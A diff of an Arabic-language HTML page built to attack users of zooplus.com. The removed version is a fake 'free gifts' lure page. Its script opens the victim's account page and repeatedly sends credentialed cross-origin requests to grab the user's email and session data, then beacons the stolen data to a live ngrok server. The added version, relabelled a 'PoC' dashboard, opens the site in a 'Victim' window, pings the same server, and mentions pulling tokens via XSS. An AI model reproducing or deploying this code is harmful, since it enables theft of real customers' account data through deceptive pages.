@@ -2,66 +2,35 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>مركز الهدايا المجانية</title>
+    <title>PoC - Security Dashboard</title>
     <style>
-        body { font-family: 'Segoe UI'; background: #121212; color: white; text-align: center; padding-top: 50px; }
-        .status-box { background: #1e1e1e; border: 1px solid #333; padding: 20px; width: 60%; margin: auto; border-radius: 10px; }
-        .btn { background: #e91e63; color: white; border: none; padding: 15px 30px; font-size: 18px; cursor: pointer; border-radius: 5px; }
-        .log { color: #00ff00; font-size: 14px; margin-top: 20px; text-align: left; padding-left: 20%; }
+        body { background: #000; color: #0f0; font-family: monospace; padding: 50px; text-align: center; }
+        .box { border: 1px solid #0f0; padding: 20px; display: inline-block; }
+        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
-
-    <div class="status-box">
-        <h1>مرحباً بك في نظام المكافآت</h1>
-        <p>اضغط على الزر لفتح حسابك وتفعيل الجائزة بجانب هذه الصفحة.</p>
-        <button class="btn" onclick="startDualAttack()">تفعيل الجائزة الآن 🎁</button>
-        <div class="log" id="logBox"></div>
+    <div class="box">
+        <h2>نظام اختبار الثغرات المتقدم</h2>
+        <p>جاري الربط مع سيرفر Ngrok: <br> https://subsphenoidal-dauntlessly-pura.ngrok-free.dev</p>
+        <button onclick="launchTarget()">فتح موقع الضحية واعتراض البيانات</button>
     </div>
 
     <script>
-        const WEBHOOK = 'https://subsphenoidal-dauntlessly-pura.ngrok-free.dev';
+        const NGROK_URL = 'https://subsphenoidal-dauntlessly-pura.ngrok-free.dev';
 
-        function logToScreen(msg) {
-            document.getElementById('logBox').innerHTML += "> " + msg + "<br>";
-        }
+        function launchTarget() {
+            // فتح الموقع في نافذة منبثقة
+            const victimWin = window.open('https://www.zooplus.com/account/overview', 'Victim');
 
-        async function startDualAttack() {
-            logToScreen("جاري فتح صفحة الضحية في نافذة جديدة...");
-            
-            // 1. فتح صفحة الضحية بجانب صفحة المهاجم
-            const victimWin = window.open('https://www.zooplus.com/account/overview');
+            // إرسال إشعار لسيرفرك بأن العملية بدأت
+            fetch(NGROK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({ status: "Target Window Opened", url: "zooplus.com" })
+            });
 
-            logToScreen("تم فتح النافذة. جاري استغلال ثغرة CORS...");
-
-            // 2. محاولة سحب البيانات الحساسة فوراً (بافتراض أن المتصفح سيرسل الكوكيز تلقائياً)
-            // سنكرر المحاولة كل 3 ثوانٍ حتى يسجل المستخدم دخوله
-            const sniffer = setInterval(async () => {
-                try {
-                    const response = await fetch('https://www.zooplus.com/account/overview', {
-                        method: 'GET',
-                        mode: 'cors',
-                        credentials: 'include' // أهم جزء لضمان إرسال كوكيز الجلسة
-                    });
-
-                    if (response.ok) {
-                        const data = await response.json();
-                        logToScreen("نجاح! تم سحب الإيميل: " + data.email);
-                        
-                        // إرسال البيانات المسروقة للـ Webhook
-                        navigator.sendBeacon(WEBHOOK, JSON.stringify({
-                            event: "SIDE_BY_SIDE_EXPLOIT",
-                            stolen_data: data,
-                            user_agent: navigator.userAgent
-                        }));
-
-                        logToScreen("تم إرسال كافة البيانات للـ Webhook بنجاح.");
-                        clearInterval(sniffer); // التوقف بعد النجاح
-                    }
-                } catch (err) {
-                    logToScreen("انتظار تفاعل المستخدم مع الصفحة الأخرى...");
-                }
-            }, 3000);
+            console.log("تم فتح النافذة. إذا كان لديك وصول XSS، سيتم سحب التوكن فوراً.");
         }
     </script>
 </body>
